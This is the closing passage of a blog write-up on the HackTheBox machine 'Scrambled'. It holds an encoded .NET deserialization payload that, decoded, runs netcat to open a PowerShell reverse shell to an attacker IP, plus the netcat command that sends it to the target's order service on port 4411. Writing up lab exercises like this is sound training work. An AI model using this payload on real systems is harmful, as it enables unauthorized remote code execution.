XpiMlowTG1OdmJTOTNhVzVtZUM4eU1EQTJMM2hoYld3aVBnMEtJQ0E4VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtVmpkRWx1YzNSaGJtTmxQZzBLSUNBZ0lEeHpaRHBRY205alpYTnpQZzBLSUNBZ0lDQWdQSE5rT2xCeWIyTmxjM011VTNSaGNuUkpibVp2UGcwS0lDQWdJQ0FnSUNBOGMyUTZVSEp2WTJWemMxTjBZWEowU1c1bWJ5QkJjbWQxYldWdWRITTlJaTlqSUVNNlhGUmxiWEJjYm1NdVpYaGxJQzFsSUhCdmQyVnljMmhsYkd3Z01UQXVNVEF1TVRZdU5EUWdPVEF3TUNJZ1UzUmhibVJoY21SRmNuSnZja1Z1WTI5a2FXNW5QU0o3ZURwT2RXeHNmU0lnVTNSaGJtUmhjbVJQZFhSd2RYUkZibU52WkdsdVp6MGllM2c2VG5Wc2JIMGlJRlZ6WlhKT1lXMWxQU0lpSUZCaGMzTjNiM0prUFNKN2VEcE9kV3hzZlNJZ1JHOXRZV2x1UFNJaUlFeHZZV1JWYzJWeVVISnZabWxzWlQwaVJtRnNjMlVpSUVacGJHVk9ZVzFsUFNKamJXUWlJQzgrRFFvZ0lDQWdJQ0E4TDNOa09sQnliMk5sYzNNdVUzUmhjblJKYm1adlBnMEtJQ0FnSUR3dmMyUTZVSEp2WTJWemN6NE5DaUFnUEM5UFltcGxZM1JFWVhSaFVISnZkbWxrWlhJdVQySnFaV04wU1c1emRHRnVZMlUrRFFvOEwwOWlhbVZqZEVSaGRHRlFjbTkyYVdSbGNqNEwL
</span></pre></table></code></div></div><p>Copy the output and open a netcat to the machine in that port. Add <code class="language-plaintext highlighter-rouge">UPLOAD_ORDER;</code> and then our payload:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>netcat 10.10.11.168 4411
<span class="gp">	SCRAMBLECORP_ORDERS_V1.0.3;</span><span class="w">
</span><span class="gp">	UPLOAD_ORDER;</span>AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2V....
</pre></table></code></div></div><p>And then we should receive a connection in our netcat.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/pentesting/'>Pentesting</a>, <a href='/categories/hackthebox/'>HackTheBox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/medium/" class="post-tag no-text-decoration" >medium</a> <a href="/tags/machines/" class="post-tag no-text-decoration" >machines</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HTB+%7C+Scrambled+-+Kaiba_404%27s+Blog&url=congkhainguyen.github.io%2Fpentesting%2Fhtb%2Fmachines%2Fscrambled" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HTB+%7C+Scrambled+-+Kaiba_404%27s+Blog&u=congkhainguyen.github.io%2Fpentesting%2Fhtb%2Fmachines%2Fscrambled" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=congkhainguyen.github.io%2Fpentesting%2Fhtb%2Fmachines%2Fscrambled&text=HTB+%7C+Scrambled+-+Kaiba_404%27s+Blog" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/ctf-like/reversing/crackme-packed">Reversing | CrackMe Packed</a><li><a href="/index">Index</a><li><a href="/malware/development/dropper-explorer-1">MalDev | Dropper Explorer.exe</a><li><a href="/malware/development/putty-1">MalDev | Putty</a><li><a href="/pentesting/htb/machines/arctic">HTB | Arctic</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/machines/">machines</a> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/thm/">thm</a> <a class="post-tag" href="/tags/medium/">medium</a> <a class="post-tag" href="/tags/rootme/">rootme</a> <a class="post-tag" href="/tags/malware/">malware</a> <a class="post-tag" href="/tags/hard/">hard</a></div></div></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/pentesting/htb/machines/faculty"><div class="card-body"> <em class="small" data-ts="1661724000" data-df="ll" > Aug 29, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB | Faculty</h3><div class="text-muted small"><p> Fingerprint The nmap show: PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 e9:41:8c:e5:54:4d:6f:14:98:76:16...</p></div></div></a></div><div class="card"> <a href="/pentesting/htb/machines/noter"><div class="card-body"> <em class="small" data-ts="1661724000" data-df="ll" > Aug 29, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB | Noter</h3><div class="text-muted small"><p> Fingerprinting The nmap gives us: PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-host...</p></div></div></a></div><div class="card"> <a href="/pentesting/htb/machines/shared"><div class="card-body"> <em class="small" data-ts="1661724000" data-df="ll" > Aug 29, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB | Shared</h3><div class="text-muted small"><p> Fingerprinting We can know that the server only has a web server: PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 91:e...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/pentesting/htb/machines/carpediem" class="btn btn-outline-primary" prompt="Older"><p>HTB | Carpediem</p></a> <a href="/malware/triage/sillyputty" class="btn btn-outline-primary" prompt="Newer"><p>Triage | SillyPutty</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/giangkhail12999">Cong Khai NGUYEN</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" rel="noopener">Jekyll</a> with <a href="#" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/machines/">machines</a> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/thm/">thm</a> <a class="post-tag" href="/tags/medium/">medium</a> <a class="post-tag" href="/tags/rootme/">rootme</a> <a class="post-tag" href="/tags/malware/">malware</a> <a class="post-tag" href="/tags/hard/">hard</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/unregister.js"></script>
